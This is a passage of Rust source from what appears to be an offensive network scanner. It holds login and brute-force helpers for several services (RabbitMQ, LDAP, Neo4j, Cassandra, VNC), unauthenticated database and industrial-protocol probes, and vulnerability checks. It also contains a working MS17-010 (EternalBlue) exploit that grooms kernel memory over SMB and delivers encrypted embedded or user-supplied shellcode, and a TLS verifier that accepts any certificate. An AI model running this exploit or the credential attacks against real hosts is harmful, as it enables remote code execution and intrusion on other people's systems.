            )?;
            let final_response = read_line(&mut auth_stream)?;
            if !final_response.contains("@ERROR") {
                return Ok(Some(module_name));
            }
        }
    }
    Ok(None)
}

fn rabbitmq_login(
    target: &OpenService,
    username: &str,
    password: &str,
    timeout_secs: u64,
) -> Result<bool> {
    let timeout_ms = timeout_secs.max(1) * 1000;
    let username = percent_encode_amqp_credential(username);
    let password = percent_encode_amqp_credential(password);
    let url = format!(
        "amqp://{username}:{password}@{}:{}/?connection_timeout={timeout_ms}",
        target.host, target.port
    );

    match AmqpConnection::insecure_open(&url) {
        Ok(connection) => {
            let _ = connection.close();
            Ok(true)
        }
        Err(_) => Ok(false),
    }
}

fn percent_encode_amqp_credential(value: &str) -> String {
    let mut encoded = String::new();
    for byte in value.bytes() {
        match byte {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                encoded.push(byte as char)
            }
            _ => encoded.push_str(&format!("%{byte:02X}")),
        }
    }
    encoded
}

fn mongodb_unauthorized(target: &OpenService) -> Result<bool> {
    let msg_response = send_tcp_payload(target, &mongodb_op_msg_packet(), 3)?;
    if msg_response.contains("totalLinesWritten") {
        return Ok(true);
    }

    let query_response = send_tcp_payload(target, &mongodb_op_query_packet(), 3)?;
    Ok(query_response.contains("totalLinesWritten"))
}

fn mongodb_op_msg_packet() -> Vec<u8> {
    vec![
        0x69, 0x00, 0x00, 0x00, 0x39, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xdd, 0x07, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x54, 0x00, 0x00, 0x00, 0x02, 0x67, 0x65, 0x74, 0x4c,
        0x6f, 0x67, 0x00, 0x10, 0x00, 0x00, 0x00, 0x73, 0x74, 0x61, 0x72, 0x74, 0x75, 0x70, 0x57,
        0x61, 0x72, 0x6e, 0x69, 0x6e, 0x67, 0x73, 0x00, 0x02, 0x24, 0x64, 0x62, 0x00, 0x06, 0x00,
        0x00, 0x00, 0x61, 0x64, 0x6d, 0x69, 0x6e, 0x00, 0x03, 0x6c, 0x73, 0x69, 0x64, 0x00, 0x1e,
        0x00, 0x00, 0x00, 0x05, 0x69, 0x64, 0x00, 0x10, 0x00, 0x00, 0x00, 0x04, 0x6e, 0x81, 0xf8,
        0x8e, 0x37, 0x7b, 0x4c, 0x97, 0x84, 0x4e, 0x90, 0x62, 0x5a, 0x54, 0x3c, 0x93, 0x00, 0x00,
    ]
}

fn mongodb_op_query_packet() -> Vec<u8> {
    vec![
        0x48, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xd4, 0x07, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x61, 0x64, 0x6d, 0x69, 0x6e, 0x2e, 0x24, 0x63, 0x6d, 0x64,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00, 0x02, 0x67,
        0x65, 0x74, 0x4c, 0x6f, 0x67, 0x00, 0x10, 0x00, 0x00, 0x00, 0x73, 0x74, 0x61, 0x72, 0x74,
        0x75, 0x70, 0x57, 0x61, 0x72, 0x6e, 0x69, 0x6e, 0x67, 0x73, 0x00, 0x00,
    ]
}

fn modbus_probe(target: &OpenService, timeout_secs: u64) -> Result<Option<String>> {
    let response = send_tcp_payload(target, &modbus_request_packet(), timeout_secs)?;
    let bytes = response.as_bytes();
    if !is_valid_modbus_response(bytes) {
        return Ok(None);
    }

    Ok(Some(parse_modbus_response(bytes)))
}

fn modbus_request_packet() -> Vec<u8> {
    vec![
        0x00, 0x01, // transaction id
        0x00, 0x00, // protocol id
        0x00, 0x06, // length
        0x01, // unit id
        0x01, // function code: Read Coils
        0x00, 0x00, // starting address
        0x00, 0x01, // quantity
    ]
}

fn is_valid_modbus_response(response: &[u8]) -> bool {
    if response.len() < 9 {
        return false;
    }

    let protocol = u16::from_be_bytes(response[2..4].try_into().unwrap_or([0xff, 0xff]));
    if protocol != 0 {
        return false;
    }

    response[7] != 0x81
}

fn parse_modbus_response(response: &[u8]) -> String {
    if response.len() < 9 {
        return String::new();
    }

    let unit_id = response[6];
    let function_code = response[7];
    let mut info = format!("Unit ID: {unit_id}, Function: 0x{function_code:02X}");

    if function_code == 0x01 && response.len() >= 10 {
        let byte_count = response[8] as usize;
        if byte_count > 0 && response.len() >= 9 + byte_count {
            let coil_value = response[9] & 0x01;
            info.push_str(&format!(", Coil Status: {coil_value}"));
        }
    }

    info
}

fn ldap_bind_and_search(
    target: &OpenService,
    username: &str,
    password: &str,
    timeout_secs: u64,
) -> Result<bool> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    match connect_stream(target, timeout) {
        Ok(mut stream) => match ldap_bind_and_search_with_stream(&mut stream, username, password) {
            Ok(true) => Ok(true),
            Ok(false) => Ok(false),
            Err(_) => {
                let mut tls_stream = connect_tls_stream(target, timeout)?;
                ldap_bind_and_search_with_stream(&mut tls_stream, username, password)
            }
        },
        Err(_) => {
            let mut tls_stream = connect_tls_stream(target, timeout)?;
            ldap_bind_and_search_with_stream(&mut tls_stream, username, password)
        }
    }
}

fn ldap_bind_and_search_with_stream<S>(
    stream: &mut S,
    username: &str,
    password: &str,
) -> Result<bool>
where
    S: Read + Write,
{
    write_and_flush_io(
        stream,
        &ldap_bind_request(1, &ldap_bind_dn(username), password),
    )?;
    let bind_response = read_available_bytes_io(stream)?;
    if bind_response.is_empty() {
        anyhow::bail!("missing ldap bind response");
    }
    if bind_response.first().copied() != Some(0x30) {
        anyhow::bail!("invalid ldap bind response");
    }
    if !ldap_operation_succeeded(&bind_response, 0x61) {
        return Ok(false);
    }

    write_and_flush_io(stream, &ldap_search_request(2))?;
    let search_response = read_available_bytes_io(stream)?;
    if search_response.is_empty() {
        anyhow::bail!("missing ldap search response");
    }
    if search_response.first().copied() != Some(0x30) {
        anyhow::bail!("invalid ldap search response");
    }
    Ok(ldap_search_succeeded(&search_response))
}

fn ldap_bind_dn(username: &str) -> String {
    if username.is_empty() {
        return String::new();
    }
    if username.contains('=') || username.contains(',') {
        username.to_string()
    } else {
        format!("cn={username},dc=example,dc=com")
    }
}

fn ldap_bind_request(message_id: i32, dn: &str, password: &str) -> Vec<u8> {
    let mut bind_body = Vec::new();
    bind_body.extend(ber_integer(message_id));

    let mut request = Vec::new();
    request.extend(ber_integer(3));
    request.extend(ber_octet_string(dn.as_bytes()));
    request.extend(ber_tlv(0x80, password.as_bytes()));
    bind_body.extend(ber_tlv(0x60, &request));

    ber_tlv(0x30, &bind_body)
}

fn ldap_search_request(message_id: i32) -> Vec<u8> {
    let mut search_body = Vec::new();
    search_body.extend(ber_octet_string(b""));
    search_body.extend(ber_enumerated(0));
    search_body.extend(ber_enumerated(0));
    search_body.extend(ber_integer(0));
    search_body.extend(ber_integer(0));
    search_body.extend(ber_boolean(false));
    search_body.extend(ber_tlv(0x87, b"objectClass"));
    search_body.extend(ber_tlv(0x30, &[]));

    let mut message = Vec::new();
    message.extend(ber_integer(message_id));
    message.extend(ber_tlv(0x63, &search_body));

    ber_tlv(0x30, &message)
}

fn ldap_operation_succeeded(response: &[u8], operation_tag: u8) -> bool {
    response.windows(5).any(|window| {
        window[0] == operation_tag && window[2] == 0x0a && window[3] == 0x01 && window[4] == 0x00
    }) || response
        .windows(3)
        .any(|window| window == [0x0a, 0x01, 0x00])
        && response.contains(&operation_tag)
}

fn ldap_search_succeeded(response: &[u8]) -> bool {
    response.contains(&0x64) || ldap_operation_succeeded(response, 0x65)
}

fn ber_tlv(tag: u8, value: &[u8]) -> Vec<u8> {
    let mut encoded = Vec::with_capacity(2 + value.len());
    encoded.push(tag);
    encoded.extend(ber_length(value.len()));
    encoded.extend_from_slice(value);
    encoded
}

fn ber_length(length: usize) -> Vec<u8> {
    if length < 0x80 {
        vec![length as u8]
    } else {
        let mut bytes = Vec::new();
        let mut value = length;
        while value > 0 {
            bytes.push((value & 0xff) as u8);
            value >>= 8;
        }
        bytes.reverse();
        let mut encoded = vec![0x80 | bytes.len() as u8];
        encoded.extend(bytes);
        encoded
    }
}

fn ber_integer(value: i32) -> Vec<u8> {
    ber_tlv(0x02, &[(value & 0xff) as u8])
}

fn ber_enumerated(value: u8) -> Vec<u8> {
    ber_tlv(0x0a, &[value])
}

fn ber_boolean(value: bool) -> Vec<u8> {
    ber_tlv(0x01, &[if value { 0xff } else { 0x00 }])
}

fn ber_octet_string(value: &[u8]) -> Vec<u8> {
    ber_tlv(0x04, value)
}

fn snmp_get_sysdescr(
    target: &OpenService,
    community: &str,
    timeout_secs: u64,
) -> Result<Option<String>> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    let socket = UdpSocket::bind("0.0.0.0:0").context("failed to bind SNMP udp socket")?;
    socket
        .set_read_timeout(Some(timeout))
        .context("failed to set SNMP read timeout")?;
    socket
        .set_write_timeout(Some(timeout))
        .context("failed to set SNMP write timeout")?;
    let target_address = format!("{}:{}", target.host, target.port);
    let socket_addr = target_address
        .to_socket_addrs()
        .with_context(|| format!("failed to resolve SNMP address {target_address}"))?
        .next()
        .with_context(|| format!("no socket addresses for SNMP target {target_address}"))?;

    let request = snmp_get_request(community, 1);
    socket
        .send_to(&request, socket_addr)
        .context("failed to send SNMP request")?;

    let mut buffer = [0u8; 2048];
    let (size, _) = socket
        .recv_from(&mut buffer)
        .context("failed to receive SNMP response")?;
    Ok(parse_snmp_response(&buffer[..size]))
}

fn snmp_get_request(community: &str, request_id: i32) -> Vec<u8> {
    let oid = [0x2b, 0x06, 0x01, 0x02, 0x01, 0x01, 0x01, 0x00];
    let varbind = ber_tlv(
        0x30,
        &[
            ber_tlv(0x06, &oid),
            ber_tlv(0x05, &[]), // NULL
        ]
        .concat(),
    );
    let varbinds = ber_tlv(0x30, &varbind);
    let pdu = ber_tlv(
        0xa0,
        &[
            ber_integer(request_id),
            ber_integer(0),
            ber_integer(0),
            varbinds,
        ]
        .concat(),
    );

    ber_tlv(
        0x30,
        &[ber_integer(1), ber_octet_string(community.as_bytes()), pdu].concat(),
    )
}

fn parse_snmp_response(response: &[u8]) -> Option<String> {
    if !response.contains(&0xa2) {
        return None;
    }
    if !response
        .windows(6)
        .any(|window| window == [0x02, 0x01, 0x00, 0x02, 0x01, 0x00])
    {
        return None;
    }

    let oid_marker = [0x06, 0x08, 0x2b, 0x06, 0x01, 0x02, 0x01, 0x01, 0x01, 0x00];
    let oid_index = response
        .windows(oid_marker.len())
        .position(|window| window == oid_marker)?;
    let value_index = oid_index + oid_marker.len();
    if value_index >= response.len() {
        return Some(String::new());
    }

    match response[value_index] {
        0x04 => {
            let (length, len_len) = parse_ber_length(response.get(value_index + 1..)?)?;
            let start = value_index + 1 + len_len;
            let end = start + length;
            if end > response.len() {
                return None;
            }
            Some(
                String::from_utf8_lossy(&response[start..end])
                    .trim()
                    .to_string(),
            )
        }
        0x80 => Some(String::new()),
        _ => Some(String::new()),
    }
}

fn neo4j_login(
    target: &OpenService,
    username: Option<&str>,
    password: Option<&str>,
    timeout_secs: u64,
) -> Result<bool> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    let mut stream = connect_stream(target, timeout)?;

    write_and_flush(
        &mut stream,
        &[
            0x60, 0x60, 0xB0, 0x17, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x04, 0x04, 0x00, 0x00,
            0x04, 0x03, 0x00, 0x00, 0x00, 0x00,
        ],
    )?;
    let mut version = [0u8; 4];
    stream
        .read_exact(&mut version)
        .context("failed to read neo4j handshake version")?;
    if version == [0, 0, 0, 0] {
        return Ok(false);
    }

    let hello = neo4j_hello_message(username, password);
    let frame = neo4j_chunk_message(&hello);
    write_and_flush(&mut stream, &frame)?;

    let response = neo4j_read_message(&mut stream)?;
    Ok(response.get(1).copied() == Some(0x70))
}

fn neo4j_hello_message(username: Option<&str>, password: Option<&str>) -> Vec<u8> {
    let mut fields = vec![("user_agent".to_string(), "rscan".to_string())];
    match (username, password) {
        (Some(username), Some(password)) => {
            fields.push(("scheme".to_string(), "basic".to_string()));
            fields.push(("principal".to_string(), username.to_string()));
            fields.push(("credentials".to_string(), password.to_string()));
        }
        _ => {
            fields.push(("scheme".to_string(), "none".to_string()));
        }
    }

    let mut message = vec![0xB1, 0x01];
    message.extend(packstream_map_string(fields));
    message
}

fn neo4j_chunk_message(message: &[u8]) -> Vec<u8> {
    let mut framed = Vec::with_capacity(message.len() + 4);
    framed.extend_from_slice(&(message.len() as u16).to_be_bytes());
    framed.extend_from_slice(message);
    framed.extend_from_slice(&[0x00, 0x00]);
    framed
}

fn neo4j_read_message(stream: &mut TcpStream) -> Result<Vec<u8>> {
    let mut message = Vec::new();
    loop {
        let mut length = [0u8; 2];
        stream
            .read_exact(&mut length)
            .context("failed to read neo4j chunk length")?;
        let chunk_len = u16::from_be_bytes(length) as usize;
        if chunk_len == 0 {
            break;
        }
        let start = message.len();
        message.resize(start + chunk_len, 0);
        stream
            .read_exact(&mut message[start..])
            .context("failed to read neo4j chunk body")?;
    }
    Ok(message)
}

fn packstream_map_string(fields: Vec<(String, String)>) -> Vec<u8> {
    let mut encoded = Vec::new();
    encoded.push(packstream_tiny_map_marker(fields.len()));
    for (key, value) in fields {
        encoded.extend(packstream_string(&key));
        encoded.extend(packstream_string(&value));
    }
    encoded
}

fn packstream_tiny_map_marker(size: usize) -> u8 {
    0xA0 | (size as u8 & 0x0F)
}

fn packstream_string(value: &str) -> Vec<u8> {
    let bytes = value.as_bytes();
    let len = bytes.len();
    let mut encoded = Vec::with_capacity(len + 2);
    match len {
        0..=15 => encoded.push(0x80 | len as u8),
        16..=255 => {
            encoded.push(0xD0);
            encoded.push(len as u8);
        }
        256..=65535 => {
            encoded.push(0xD1);
            encoded.extend_from_slice(&(len as u16).to_be_bytes());
        }
        _ => {
            encoded.push(0xD2);
            encoded.extend_from_slice(&(len as u32).to_be_bytes());
        }
    }
    encoded.extend_from_slice(bytes);
    encoded
}

fn cassandra_login(
    target: &OpenService,
    username: Option<&str>,
    password: Option<&str>,
    timeout_secs: u64,
) -> Result<bool> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    let mut stream = connect_stream(target, timeout)?;

    write_and_flush(&mut stream, &cassandra_startup_frame())?;
    let response = cassandra_read_frame(&mut stream)?;
    match response.opcode {
        0x02 => Ok(username.is_none() && password.is_none()),
        0x03 => {
            let (Some(username), Some(password)) = (username, password) else {
                return Ok(false);
            };
            let auth_frame = cassandra_auth_response_frame(username, password);
            write_and_flush(&mut stream, &auth_frame)?;
            let auth_result = cassandra_read_frame(&mut stream)?;
            Ok(matches!(auth_result.opcode, 0x10 | 0x02))
        }
        _ => Ok(false),
    }
}

#[derive(Debug)]
struct CassandraFrame {
    opcode: u8,
    #[allow(dead_code)]
    body: Vec<u8>,
}

fn cassandra_startup_frame() -> Vec<u8> {
    let mut body = Vec::new();
    body.extend_from_slice(&1u16.to_be_bytes());
    body.extend(cassandra_string("CQL_VERSION"));
    body.extend(cassandra_string("3.0.0"));
    cassandra_frame(0x04, 0x01, &body)
}

fn cassandra_auth_response_frame(username: &str, password: &str) -> Vec<u8> {
    let mut token = Vec::new();
    token.push(0);
    token.extend_from_slice(username.as_bytes());
    token.push(0);
    token.extend_from_slice(password.as_bytes());

    let mut body = Vec::new();
    body.extend_from_slice(&(token.len() as u32).to_be_bytes());
    body.extend_from_slice(&token);
    cassandra_frame(0x04, 0x0F, &body)
}

fn cassandra_frame(version: u8, opcode: u8, body: &[u8]) -> Vec<u8> {
    let mut frame = Vec::with_capacity(9 + body.len());
    frame.push(version);
    frame.push(0x00);
    frame.extend_from_slice(&0u16.to_be_bytes());
    frame.push(opcode);
    frame.extend_from_slice(&(body.len() as u32).to_be_bytes());
    frame.extend_from_slice(body);
    frame
}

fn cassandra_string(value: &str) -> Vec<u8> {
    let bytes = value.as_bytes();
    let mut encoded = Vec::with_capacity(2 + bytes.len());
    encoded.extend_from_slice(&(bytes.len() as u16).to_be_bytes());
    encoded.extend_from_slice(bytes);
    encoded
}

fn cassandra_read_frame(stream: &mut TcpStream) -> Result<CassandraFrame> {
    let mut header = [0u8; 9];
    stream
        .read_exact(&mut header)
        .context("failed to read cassandra header")?;
    let body_len = u32::from_be_bytes(header[5..9].try_into().unwrap_or([0, 0, 0, 0])) as usize;
    let mut body = vec![0u8; body_len];
    if body_len > 0 {
        stream
            .read_exact(&mut body)
            .context("failed to read cassandra body")?;
    }
    Ok(CassandraFrame {
        opcode: header[4],
        body,
    })
}

fn vnc_login(target: &OpenService, password: &str, timeout_secs: u64) -> Result<bool> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    let mut stream = connect_stream(target, timeout)?;

    let mut version = [0u8; 12];
    stream
        .read_exact(&mut version)
        .context("failed to read vnc protocol version")?;
    write_and_flush(&mut stream, &version)?;

    let mut security_count = [0u8; 1];
    stream
        .read_exact(&mut security_count)
        .context("failed to read vnc security type count")?;
    if security_count[0] == 0 {
        return Ok(false);
    }

    let mut security_types = vec![0u8; security_count[0] as usize];
    stream
        .read_exact(&mut security_types)
        .context("failed to read vnc security types")?;
    if !security_types.contains(&2) {
        return Ok(false);
    }

    write_and_flush(&mut stream, &[2])?;

    let mut challenge = [0u8; 16];
    stream
        .read_exact(&mut challenge)
        .context("failed to read vnc auth challenge")?;
    let response = vnc_encrypt_challenge(password, &challenge)?;
    write_and_flush(&mut stream, &response)?;

    let mut status = [0u8; 4];
    stream
        .read_exact(&mut status)
        .context("failed to read vnc auth status")?;
    Ok(u32::from_be_bytes(status) == 0)
}

fn findnet_probe(
    target: &OpenService,
    timeout_secs: u64,
) -> Result<Option<(String, Vec<String>, Vec<String>)>> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    let mut stream = connect_stream(target, timeout)?;
    write_and_flush(&mut stream, FINDNET_PROBE_ONE)?;
    let _ = read_available_bytes(&mut stream)?;
    write_and_flush(&mut stream, FINDNET_PROBE_TWO)?;
    let response = read_available_bytes(&mut stream)?;
    if response.len() < 42 {
        return Ok(None);
    }

    Ok(parse_findnet_payload(&response[42..]))
}

fn netbios_probe(target: &OpenService, timeout_secs: u64) -> Result<Option<NetBiosInfo>> {
    let mut info = netbios_query_udp(&target.host, timeout_secs)?.unwrap_or_default();
    if let Some(smb_info) = netbios_query_tcp(target, &info, timeout_secs)? {
        join_netbios(&mut info, &smb_info);
    }

    if info.computer_name.is_empty()
        && info.domain_name.is_empty()
        && info.netbios_domain.is_empty()
        && info.netbios_computer.is_empty()
        && info.workstation_service.is_empty()
        && info.server_service.is_empty()
        && info.domain_controllers.is_empty()
        && info.os_version.is_empty()
    {
        Ok(None)
    } else {
        Ok(Some(info))
    }
}

fn netbios_query_udp(host: &str, timeout_secs: u64) -> Result<Option<NetBiosInfo>> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    let socket = UdpSocket::bind("0.0.0.0:0").context("failed to bind netbios udp socket")?;
    socket
        .set_read_timeout(Some(timeout))
        .context("failed to set netbios udp read timeout")?;
    socket
        .set_write_timeout(Some(timeout))
        .context("failed to set netbios udp write timeout")?;
    socket
        .connect(format!("{host}:137"))
        .with_context(|| format!("failed to connect udp to {host}:137"))?;
    socket
        .send(NETBIOS_UDP_PROBE)
        .context("failed to send netbios udp probe")?;
    let mut buffer = [0u8; 2048];
    let size = match socket.recv(&mut buffer) {
        Ok(size) => size,
        Err(_) => return Ok(None),
    };
    Ok(parse_netbios_udp_response(&buffer[..size]))
}

fn netbios_query_tcp(
    target: &OpenService,
    info: &NetBiosInfo,
    timeout_secs: u64,
) -> Result<Option<NetBiosInfo>> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    let mut stream = match connect_stream(target, timeout) {
        Ok(stream) => stream,
        Err(_) => return Ok(None),
    };

    if !info.server_service.is_empty() || !info.workstation_service.is_empty() {
        let seed = if !info.server_service.is_empty() {
            &info.server_service
        } else {
            &info.workstation_service
        };
        let request = netbios_session_request(seed);
        if write_and_flush(&mut stream, &request).is_err()
            || read_available_bytes(&mut stream).is_err()
        {
            return Ok(None);
        }
    }

    if write_and_flush(&mut stream, NETBIOS_NEGOTIATE_ONE).is_err()
        || read_available_bytes(&mut stream).is_err()
    {
        return Ok(None);
    }
    if write_and_flush(&mut stream, NETBIOS_NEGOTIATE_TWO).is_err() {
        return Ok(None);
    }
    let response = match read_available_bytes(&mut stream) {
        Ok(bytes) => bytes,
        Err(_) => return Ok(None),
    };
    Ok(parse_netbios_ntlm_response(&response))
}

fn detect_smbghost(target: &OpenService, timeout_secs: u64) -> Result<bool> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    let mut stream = connect_stream(target, timeout)?;
    write_and_flush(&mut stream, SMBGHOST_PROBE)?;
    let response = read_available_bytes(&mut stream)?;
    Ok(response.len() >= 76
        && response.windows(6).any(|window| window == b"Public")
        && response.get(72..74) == Some(&[0x11, 0x03])
        && response.get(74..76) == Some(&[0x02, 0x00]))
}

fn detect_ms17010(target: &OpenService, timeout_secs: u64) -> Result<Option<(String, bool)>> {
    let mut session = ms17010_anonymous_ipc_session(target, timeout_secs)?;
    let mut named_pipe = ms17010_trans_named_pipe_request();
    named_pipe[28..30].copy_from_slice(&session.tree_id);
    named_pipe[32..34].copy_from_slice(&session.user_id);
    write_and_flush(&mut session.stream, &named_pipe)?;
    let pipe_response = read_ms17010_response(&mut session.stream, "trans named pipe")?;
    if pipe_response.get(9..13) != Some(&[0x05, 0x02, 0x00, 0xC0]) {
        return Ok(None);
    }

    let mut trans2 = ms17010_trans2_session_setup_request();
    trans2[28..30].copy_from_slice(&session.tree_id);
    trans2[32..34].copy_from_slice(&session.user_id);
    write_and_flush(&mut session.stream, &trans2)?;
    let trans2_response = read_ms17010_response(&mut session.stream, "trans2 session setup")?;
    Ok(Some((session.os, trans2_response.get(34) == Some(&0x51))))
}

#[derive(Debug)]
struct Ms17010Session {
    stream: TcpStream,
    user_id: [u8; 2],
    tree_id: [u8; 2],
    os: String,
}

#[derive(Debug)]
struct NoCertificateVerification;

type ClientTlsStream = StreamOwned<ClientConnection, TcpStream>;

impl ServerCertVerifier for NoCertificateVerification {
    fn verify_server_cert(
        &self,
        _end_entity: &CertificateDer<'_>,
        _intermediates: &[CertificateDer<'_>],
        _server_name: &ServerName<'_>,
        _ocsp_response: &[u8],
        _now: UnixTime,
    ) -> std::result::Result<ServerCertVerified, rustls::Error> {
        Ok(ServerCertVerified::assertion())
    }

    fn verify_tls12_signature(
        &self,
        _message: &[u8],
        _cert: &CertificateDer<'_>,
        _dss: &DigitallySignedStruct,
    ) -> std::result::Result<HandshakeSignatureValid, rustls::Error> {
        Ok(HandshakeSignatureValid::assertion())
    }

    fn verify_tls13_signature(
        &self,
        _message: &[u8],
        _cert: &CertificateDer<'_>,
        _dss: &DigitallySignedStruct,
    ) -> std::result::Result<HandshakeSignatureValid, rustls::Error> {
        Ok(HandshakeSignatureValid::assertion())
    }

    fn supported_verify_schemes(&self) -> Vec<SignatureScheme> {
        rustls::crypto::aws_lc_rs::default_provider()
            .signature_verification_algorithms
            .supported_schemes()
    }
}

fn ms17010_anonymous_ipc_session(
    target: &OpenService,
    timeout_secs: u64,
) -> Result<Ms17010Session> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    let mut stream = connect_stream(target, timeout)?;

    write_and_flush(&mut stream, &ms17010_negotiate_request())?;
    let negotiate_response = read_ms17010_response(&mut stream, "negotiate")?;
    if smb_status_code(&negotiate_response)? != 0 {
        anyhow::bail!("ms17010 negotiate returned non-zero status");
    }

    write_and_flush(&mut stream, &ms17010_session_setup_request())?;
    let session_response = read_ms17010_response(&mut stream, "session setup")?;
    if smb_status_code(&session_response)? != 0 {
        anyhow::bail!("ms17010 session setup returned non-zero status");
    }
    let user_id = smb_user_id(&session_response)?;
    let os = parse_ms17010_os(&session_response);

    let tree_connect = ms17010_tree_connect_request(&target.host, user_id);
    write_and_flush(&mut stream, &tree_connect)?;
    let tree_response = read_ms17010_response(&mut stream, "tree connect")?;
    let tree_id = smb_tree_id(&tree_response)?;

    Ok(Ms17010Session {
        stream,
        user_id,
        tree_id,
        os,
    })
}

fn exploit_ms17010(target: &OpenService, timeout_secs: u64, shellcode_spec: &str) -> Result<()> {
    let shellcode = resolve_ms17010_shellcode(shellcode_spec)?;
    let payload = ms17010_kernel_user_payload(&shellcode)?;
    let mut last_error = None;

    for attempt in 0..MS17010_EXPLOIT_MAX_ATTEMPTS {
        let grooms = MS17010_EXPLOIT_INITIAL_GROOMS + attempt * 5;
        match exploit_ms17010_once(target, timeout_secs, grooms, &payload) {
            Ok(()) => return Ok(()),
            Err(error) => last_error = Some(error),
        }
    }

    Err(last_error.unwrap_or_else(|| anyhow::anyhow!("ms17010 exploit attempts exhausted")))
}

fn exploit_ms17010_once(
    target: &OpenService,
    timeout_secs: u64,
    groom_count: usize,
    payload: &[u8],
) -> Result<()> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    let mut session = ms17010_anonymous_ipc_session(target, timeout_secs)?;
    smb1_large_buffer(&mut session.stream, session.tree_id, session.user_id)?;

    let free_hole_start = smb1_free_hole(target, timeout, true)?;
    let mut groom_streams = smb2_grooms(target, timeout, groom_count)?;

    let free_hole_end = smb1_free_hole(target, timeout, false)?;
    let _ = free_hole_start.shutdown(std::net::Shutdown::Both);
    groom_streams.extend(smb2_grooms(target, timeout, MS17010_EXPLOIT_SECOND_GROOMS)?);
    let _ = free_hole_end.shutdown(std::net::Shutdown::Both);

    let exploit_packet =
        smb1_trans2_exploit_packet(session.tree_id, session.user_id, 15, "exploit");
    write_and_flush(&mut session.stream, &exploit_packet)?;
    let _ = read_smb1_packet(&mut session.stream, "trans2 exploit")?;

    let body = smb2_body(payload);
    for stream in &mut groom_streams {
        write_and_flush(stream, &body[..MS17010_EXPLOIT_BODY_FIRST_CHUNK])?;
    }
    for stream in &mut groom_streams {
        write_and_flush(
            stream,
            &body[MS17010_EXPLOIT_BODY_FIRST_CHUNK..MS17010_EXPLOIT_BODY_SECOND_END],
        )?;
    }

    for stream in groom_streams {
        let _ = stream.shutdown(std::net::Shutdown::Both);
    }

    Ok(())
}

fn resolve_ms17010_shellcode(spec: &str) -> Result<Vec<u8>> {
    let normalized = spec.trim();
    let shellcode = match normalized {
        "bind" | "add" | "guest" => {
            let encrypted = embedded_ms17010_preset(normalized)
                .with_context(|| format!("missing ms17010 preset {normalized} in Go source"))?;
            let mut ciphertext = base64::engine::general_purpose::STANDARD
                .decode(encrypted)
                .context("failed to decode embedded ms17010 shellcode")?;
            let decrypted =
                Aes128CbcDecryptor::<Aes128>::new_from_slices(MS17010_AES_KEY, MS17010_AES_KEY)
                    .context("failed to initialize ms17010 shellcode decryptor")?
                    .decrypt_padded_mut::<Pkcs7>(&mut ciphertext)
                    .map_err(|_| anyhow::anyhow!("failed to decrypt embedded ms17010 shellcode"))?;
            decode_ms17010_shellcode_hex(
                std::str::from_utf8(decrypted)
                    .context("embedded ms17010 shellcode is not valid utf-8")?,
            )?
        }
        "cs" => Vec::new(),
        value if value.starts_with("file:") => fs::read(&value[5..])
            .with_context(|| format!("failed to read ms17010 shellcode file {}", &value[5..]))?,
        value => decode_ms17010_shellcode_hex(value)?,
    };

    if shellcode.len() < 10 {
        anyhow::bail!("invalid ms17010 shellcode: fewer than 10 bytes");
    }

    Ok(shellcode)
}

fn embedded_ms17010_preset(name: &str) -> Option<&'static str> {
    let marker = format!("case \"{name}\":");
    let (_, remainder) = MS17010_PRESET_SOURCE.split_once(&marker)?;
    let (_, remainder) = remainder.split_once("sc_enc := \"")?;
    let (encoded, _) = remainder.split_once('"')?;
    Some(encoded)
}

fn decode_ms17010_shellcode_hex(value: &str) -> Result<Vec<u8>> {
    let normalized = value
        .chars()
        .filter(|ch| !ch.is_whitespace())
        .collect::<String>();
    hex::decode(&normalized).context("failed to decode ms17010 shellcode hex")
}

fn ms17010_kernel_user_payload(shellcode: &[u8]) -> Result<Vec<u8>> {
    let max_shellcode_size =
        MS17010_PACKET_MAX_LEN - MS17010_PACKET_SETUP_LEN - MS17010_EXPLOIT_LOADER.len() - 2;
    if shellcode.len() > max_shellcode_size {
        anyhow::bail!(
            "ms17010 shellcode exceeds limit: {} > {}",
            shellcode.len(),
            max_shellcode_size
        );
    }

    let mut payload = Vec::with_capacity(MS17010_EXPLOIT_LOADER.len() + 2 + shellcode.len());
    payload.extend_from_slice(MS17010_EXPLOIT_LOADER);
    payload.extend_from_slice(&(shellcode.len() as u16).to_le_bytes());
    payload.extend_from_slice(shellcode);
    Ok(payload)
}

fn smb1_large_buffer(stream: &mut TcpStream, tree_id: [u8; 2], user_id: [u8; 2]) -> Result<()> {
    let response = smb1_nt_trans_request(tree_id, user_id);
    write_and_flush(stream, &response)?;
    let trans_header = read_smb1_packet(stream, "nt trans")?;
    let tree_id = smb_tree_id(&trans_header)?;
    let user_id = smb_user_id(&trans_header)?;

    let mut packets = Vec::new();
    packets.extend_from_slice(&smb1_trans2_exploit_packet(tree_id, user_id, 0, "zero"));
    for timeout in 1..15 {
        packets.extend_from_slice(&smb1_trans2_exploit_packet(
            tree_id, user_id, timeout, "buffer",
        ));
    }
    packets.extend_from_slice(&smb1_echo_packet(tree_id, user_id));
    write_and_flush(stream, &packets)?;
    let _ = read_smb1_packet(stream, "large buffer")?;
    Ok(())
}

fn smb1_nt_trans_request(tree_id: [u8; 2], user_id: [u8; 2]) -> Vec<u8> {
    let mut packet = Vec::new();
    packet.extend_from_slice(&[0x00, 0x00, 0x04, 0x38]);
    packet.extend_from_slice(b"\xFFSMB");
    packet.push(0xA0);
